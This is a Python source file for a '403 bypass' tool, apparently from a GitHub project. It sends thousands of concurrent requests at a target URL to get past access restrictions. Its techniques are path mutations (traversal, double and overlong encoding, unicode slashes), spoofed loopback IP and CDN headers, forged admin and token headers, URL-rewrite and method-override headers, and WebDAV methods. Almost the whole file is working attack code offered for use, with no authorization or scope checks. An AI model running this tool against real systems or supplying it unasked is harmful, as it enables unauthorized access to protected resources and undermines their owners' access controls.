#!/usr/bin/env python3
"""
🚀 403 BYPASS TOOL - ULTIMATE EDITION
Advanced 403 Forbidden bypass tool with 100+ techniques

Author: mrx-arafat
GitHub: https://github.com/mrx-arafat/Web-403-Bypass-dos2unix
Version: 2.0.0

Features:
- 100+ bypass techniques including modern methods
- Multi-threading for fast execution
- Smart payload generation
- Cloud & CDN specific bypasses
- Modern framework detection
- Comprehensive reporting
- Rate limiting and safety features
"""

import asyncio
import aiohttp
import argparse
import json
import time
import random
import urllib.parse
import sys
import os
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple
import logging
from pathlib import Path

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

@dataclass
class BypassResult:
    """Result of a bypass attempt"""
    url: str
    method: str
    status_code: int
    response_length: int
    response_time: float
    technique: str
    headers: Dict[str, str]
    success: bool = False
    
class BypassTechniques:
    """Collection of all bypass techniques"""
    
    @staticmethod
    def get_path_variations(path: str) -> List[str]:
        """Generate path variations for bypass"""
        variations = [path]
        
        # Basic variations
        variations.extend([
            f"{path}/",
            f"{path}//",
            f"{path}/./",
            f"{path}/../{path.lstrip('/')}",
            f"/{path.lstrip('/')}",
            f".{path}",
            f"{path}.",
            f"{path}~",
            f"{path}%20",
            f"{path}%09",
            f"{path}%00",
            f"{path}#",
            f"{path}?",
            f"{path};",
        ])
        
        # Case variations
        variations.extend([
            path.upper(),
            path.lower(),
            path.capitalize(),
            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(path))
        ])
        
        # Encoding variations
        encoded_path = urllib.parse.quote(path)
        double_encoded = urllib.parse.quote(encoded_path)
        variations.extend([
            encoded_path,
            double_encoded,
            path.replace('/', '%2f'),
            path.replace('/', '%252f'),
            path.replace('/', '%c0%af'),
            path.replace('/', '%e0%80%af'),
            path.replace('/', '\\'),
            path.replace('/', '%5c'),
            path.replace('/', '%255c'),
        ])
        
        # Unicode variations
        variations.extend([
            path.replace('/', '\u002f'),
            path.replace('/', '\uff0f'),
            path.replace('/', '\u2215'),
            path.replace('/', '\u29f8'),
        ])
        
        # Directory traversal
        variations.extend([
            f"..{path}",
            f"...{path}",
            f"....{path}",
            f"/{path}/../{path.lstrip('/')}",
            f"/{path}/../../{path.lstrip('/')}",
        ])
        
        # Modern framework paths
        variations.extend([
            f"/_next{path}",
            f"/api{path}",
            f"/static{path}",
            f"/assets{path}",
            f"/build{path}",
            f"/dist{path}",
            f"/public{path}",
            f"/.netlify{path}",
            f"/.vercel{path}",
            f"/functions{path}",
        ])
        
        # Cloud platform paths
        variations.extend([
            f"/.aws{path}",
            f"/s3{path}",
            f"/lambda{path}",
            f"/.azure{path}",
            f"/blob{path}",
            f"/.gcp{path}",
            f"/storage{path}",
        ])
        
        # API variations
        variations.extend([
            f"/api/v1{path}",
            f"/api/v2{path}",
            f"/api/v3{path}",
            f"/api/beta{path}",
            f"/api/alpha{path}",
            f"/graphql{path}",
            f"/rest{path}",
        ])
        
        # Container paths
        variations.extend([
            f"/docker{path}",
            f"/containers{path}",
            f"/k8s{path}",
            f"/kubernetes{path}",
            f"/metrics{path}",
            f"/health{path}",
        ])
        
        return list(set(variations))  # Remove duplicates
    
    @staticmethod
    def get_header_variations() -> List[Dict[str, str]]:
        """Generate header variations for bypass"""
        headers_list = []
        
        # IP spoofing headers
        fake_ips = ["127.0.0.1", "localhost", "0.0.0.0", "192.168.1.1", "10.0.0.1"]
        for ip in fake_ips:
            headers_list.extend([
                {"X-Forwarded-For": ip},
                {"X-Real-IP": ip},
                {"X-Originating-IP": ip},
                {"X-Remote-IP": ip},
                {"X-Client-IP": ip},
                {"X-Remote-Addr": ip},
                {"X-Forwarded-Host": ip},
                {"X-Host": ip},
                {"X-Forwarded-Server": ip},
                {"X-HTTP-Host-Override": ip},
                {"Forwarded": f"for={ip}"},
                {"X-Cluster-Client-IP": ip},
                {"X-Forwarded": ip},
                {"Forwarded-For": ip},
                {"X-Forwarded-Proto": "https"},
            ])
        
        # CDN bypass headers
        headers_list.extend([
            # Cloudflare
            {"CF-Connecting-IP": "127.0.0.1"},
            {"CF-IPCountry": "US"},
            {"CF-RAY": "1234567890-DFW"},
            {"CF-Visitor": '{"scheme":"https"}'},
            
            # Akamai
            {"True-Client-IP": "127.0.0.1"},
            {"Akamai-Origin-Hop": "1"},
            
            # Fastly
            {"Fastly-Client-IP": "127.0.0.1"},
            {"Fastly-FF": "cache-sjc10043-SJC"},
            
            # AWS CloudFront
            {"CloudFront-Forwarded-Proto": "https"},
            {"CloudFront-Is-Desktop-Viewer": "true"},
            {"CloudFront-Is-Mobile-Viewer": "false"},
            
            # Generic CDN
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Scheme": "https"},
            {"X-Scheme": "https"},
        ])
        
        # Authorization bypass headers
        headers_list.extend([
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-User": "admin"},
            {"X-Remote-User": "admin"},
            {"X-User": "admin"},
            {"X-Username": "admin"},
            {"X-Admin": "true"},
            {"X-Access-Token": "admin"},
            {"X-Auth-Token": "admin"},
            {"X-API-Key": "admin"},
            {"Authorization": "Bearer admin"},
            {"X-Authorized": "true"},
            {"X-Allow": "true"},
            {"X-Permission": "admin"},
            {"X-Role": "admin"},
            {"X-Privilege": "admin"},
        ])
        
        # URL rewriting headers
        headers_list.extend([
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Override-URL": "/admin"},
            {"X-Destination": "/admin"},
            {"X-HTTP-DestinationURL": "/admin"},
            {"X-Forwarded-Uri": "/admin"},
            {"X-Forwarded-Path": "/admin"},
            {"X-Real-Uri": "/admin"},
            {"X-Original-Uri": "/admin"},
            {"X-Request-Uri": "/admin"},
        ])
        
        # HTTP method override
        methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE"]
        for method in methods:
            headers_list.extend([
                {"X-HTTP-Method": method},
                {"X-HTTP-Method-Override": method},
                {"X-Method-Override": method},
                {"_method": method},
            ])
        
        # Content type variations
        headers_list.extend([
            {"Content-Type": "application/json"},
            {"Content-Type": "application/xml"},
            {"Content-Type": "text/plain"},
            {"Content-Type": "application/x-www-form-urlencoded"},
            {"Accept": "application/json"},
            {"Accept": "*/*"},
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
        ])
        
        # Cache bypass
        headers_list.extend([
            {"Cache-Control": "no-cache"},
            {"Pragma": "no-cache"},
            {"Cache-Control": "max-age=0"},
            {"If-None-Match": "*"},
            {"If-Modified-Since": "Wed, 21 Oct 2015 07:28:00 GMT"},
        ])
        
        # User agent variations
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
        ]
        for ua in user_agents:
            headers_list.append({"User-Agent": ua})
        
        return headers_list
    
    @staticmethod
    def get_http_methods() -> List[str]:
        """Get list of HTTP methods to try"""
        return [
            "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", 
            "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", 
            "COPY", "MOVE", "LOCK", "UNLOCK", "VERSION-CONTROL",
            "REPORT", "CHECKOUT", "CHECKIN", "UNCHECKOUT", "MKWORKSPACE",
            "UPDATE", "LABEL", "MERGE", "BASELINE-CONTROL", "MKACTIVITY"
        ]

class Bypass403:
    """Main bypass tool class"""
    
    def __init__(self, target_url: str, path: str = "/admin", threads: int = 20, 
                 timeout: int = 10, delay: float = 0.1, verbose: bool = False):
        self.target_url = target_url.rstrip('/')
        self.path = path
        self.threads = threads
        self.timeout = timeout
        self.delay = delay
        self.verbose = verbose
        self.results = []
        self.successful_bypasses = []
        
        # Setup logging
        log_level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=log_level,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        # Load wordlist if path is a file
        if os.path.isfile(path):
            with open(path, 'r') as f:
                self.paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        else:
            self.paths = [path]
    
    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.HEADER}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                        🚀 403 BYPASS TOOL - ULTIMATE EDITION 🚀              ║
║                              Advanced Forbidden Bypass                       ║
║                                                                              ║
║  Author: mrx-arafat                                                          ║
║  GitHub: https://github.com/mrx-arafat/Web-403-Bypass-dos2unix              ║
║  Version: 2.0.0                                                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.ENDC}

{Colors.OKCYAN}🎯 Target: {self.target_url}
📁 Path(s): {len(self.paths)} path(s) to test
🧵 Threads: {self.threads}
⏱️  Timeout: {self.timeout}s
⏳ Delay: {self.delay}s{Colors.ENDC}
"""
        print(banner)
    
    async def test_bypass(self, session: aiohttp.ClientSession, url: str, method: str, 
                         headers: Dict[str, str], technique: str) -> BypassResult:
        """Test a single bypass technique"""
        start_time = time.time()
        
        try:
            async with session.request(
                method=method,
                url=url,
                headers=headers,
                allow_redirects=False,
                timeout=aiohttp.ClientTimeout(total=self.timeout)
            ) as response:
                response_time = time.time() - start_time
                response_text = await response.text()
                
                # Determine if bypass was successful
                success = self.is_successful_bypass(response.status, len(response_text))
                
                result = BypassResult(
                    url=url,
                    method=method,
                    status_code=response.status,
                    response_length=len(response_text),
                    response_time=response_time,
                    technique=technique,
                    headers=headers,
                    success=success
                )
                
                if success:
                    self.successful_bypasses.append(result)
                    self.print_success(result)
                elif self.verbose:
                    self.print_result(result)
                
                return result
                
        except Exception as e:
            if self.verbose:
                self.logger.debug(f"Error testing {url}: {str(e)}")
            
            return BypassResult(
                url=url,
                method=method,
                status_code=0,
                response_length=0,
                response_time=time.time() - start_time,
                technique=technique,
                headers=headers,
                success=False
            )
    
    def is_successful_bypass(self, status_code: int, response_length: int) -> bool:
        """Determine if a bypass attempt was successful"""
        # Success indicators
        if status_code in [200, 201, 202, 204]:
            return True
        
        # Redirects might indicate partial success
        if status_code in [301, 302, 307, 308] and response_length > 0:
            return True
        
        # Large response might indicate success even with error codes
        if response_length > 1000 and status_code not in [403, 404]:
            return True
        
        return False
    
    def print_success(self, result: BypassResult):
        """Print successful bypass result"""
        print(f"{Colors.OKGREEN}✅ SUCCESS: {result.technique}")
        print(f"   URL: {result.url}")
        print(f"   Method: {result.method}")
        print(f"   Status: {result.status_code}")
        print(f"   Length: {result.response_length}")
        print(f"   Time: {result.response_time:.3f}s{Colors.ENDC}")
        print()
    
    def print_result(self, result: BypassResult):
        """Print bypass result"""
        color = Colors.OKGREEN if result.success else Colors.FAIL
        status = "SUCCESS" if result.success else "FAILED"
        print(f"{color}[{status}] {result.technique} - {result.status_code} - {result.response_length}b{Colors.ENDC}")
    
    async def run_bypass_tests(self):
        """Run all bypass tests"""
        self.print_banner()
        
        print(f"{Colors.OKBLUE}🚀 Starting bypass tests...{Colors.ENDC}\n")
        
        # Generate all test cases
        test_cases = []
        
        for base_path in self.paths:
            # Path variations
            path_variations = BypassTechniques.get_path_variations(base_path)
            
            for path_var in path_variations:
                test_url = urllib.parse.urljoin(self.target_url, path_var)
                
                # Test with different methods and headers
                methods = BypassTechniques.get_http_methods()
                header_variations = BypassTechniques.get_header_variations()
                
                # Basic method tests
                for method in methods[:5]:  # Limit to common methods for path variations
                    test_cases.append((
                        test_url, method, {}, f"Path Variation + {method}"
                    ))
                
                # Header bypass tests (with GET method)
                for headers in header_variations:
                    test_cases.append((
                        test_url, "GET", headers, f"Header Bypass: {list(headers.keys())[0]}"
                    ))
        
        print(f"{Colors.OKCYAN}📊 Total test cases: {len(test_cases)}{Colors.ENDC}\n")
        
        # Run tests with rate limiting
        connector = aiohttp.TCPConnector(limit=self.threads)
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            semaphore = asyncio.Semaphore(self.threads)
            
            async def limited_test(test_case):
                async with semaphore:
                    url, method, headers, technique = test_case
                    result = await self.test_bypass(session, url, method, headers, technique)
                    self.results.append(result)
                    
                    # Rate limiting
                    if self.delay > 0:
                        await asyncio.sleep(self.delay)
                    
                    return result
            
            # Execute all tests
            tasks = [limited_test(test_case) for test_case in test_cases]
            
            # Show progress
            completed = 0
            for task in asyncio.as_completed(tasks):
                await task
                completed += 1
                if completed % 100 == 0:
                    print(f"{Colors.OKCYAN}Progress: {completed}/{len(test_cases)} tests completed{Colors.ENDC}")
    
    def generate_report(self, output_file: str = None, format_type: str = "json"):
        """Generate bypass report"""
        print(f"\n{Colors.OKBLUE}📊 BYPASS REPORT{Colors.ENDC}")
        print("=" * 60)
        
        total_tests = len(self.results)
        successful_tests = len(self.successful_bypasses)
        success_rate = (successful_tests / total_tests * 100) if total_tests > 0 else 0
        
        print(f"Total Tests: {total_tests}")
        print(f"Successful Bypasses: {successful_tests}")
        print(f"Success Rate: {success_rate:.2f}%")
        
        if self.successful_bypasses:
            print(f"\n{Colors.OKGREEN}🎯 SUCCESSFUL BYPASSES:{Colors.ENDC}")
            for i, result in enumerate(self.successful_bypasses, 1):
                print(f"{i}. {result.technique}")
                print(f"   URL: {result.url}")
                print(f"   Method: {result.method}")
                print(f"   Status: {result.status_code}")
                print(f"   Response Length: {result.response_length}")
                print()
        
        # Save report if requested
        if output_file:
            report_data = {
                "target": self.target_url,
                "total_tests": total_tests,
                "successful_bypasses": successful_tests,
                "success_rate": success_rate,
                "results": [asdict(result) for result in self.results],
                "successful_results": [asdict(result) for result in self.successful_bypasses]
            }
            
            if format_type == "json":
                with open(output_file, 'w') as f:
                    json.dump(report_data, f, indent=2)
            
            print(f"{Colors.OKGREEN}📄 Report saved to: {output_file}{Colors.ENDC}")

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description="🚀 403 Bypass Tool - Ultimate Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 bypass403.py https://example.com
  python3 bypass403.py https://example.com -p /admin
  python3 bypass403.py https://example.com -p wordlist.txt -t 50
  python3 bypass403.py https://example.com -o report.json -v
        """
    )
    
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-p", "--path", default="/admin", 
                       help="Path to test or wordlist file (default: /admin)")
    parser.add_argument("-t", "--threads", type=int, default=20,
                       help="Number of threads (default: 20)")
    parser.add_argument("--timeout", type=int, default=10,
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("--delay", type=float, default=0.1,
                       help="Delay between requests in seconds (default: 0.1)")
    parser.add_argument("-o", "--output", help="Output file for report")
    parser.add_argument("-f", "--format", choices=["json"], default="json",
                       help="Output format (default: json)")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Verbose output")
    
    args = parser.parse_args()
    
    # Initialize bypass tool
    bypass_tool = Bypass403(
        target_url=args.url,
        path=args.path,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        verbose=args.verbose
    )
    
    try:
        # Run bypass tests
        await bypass_tool.run_bypass_tests()
        
        # Generate report
        bypass_tool.generate_report(args.output, args.format)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}⚠️  Tests interrupted by user{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.FAIL}❌ Error: {str(e)}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    asyncio.run(main())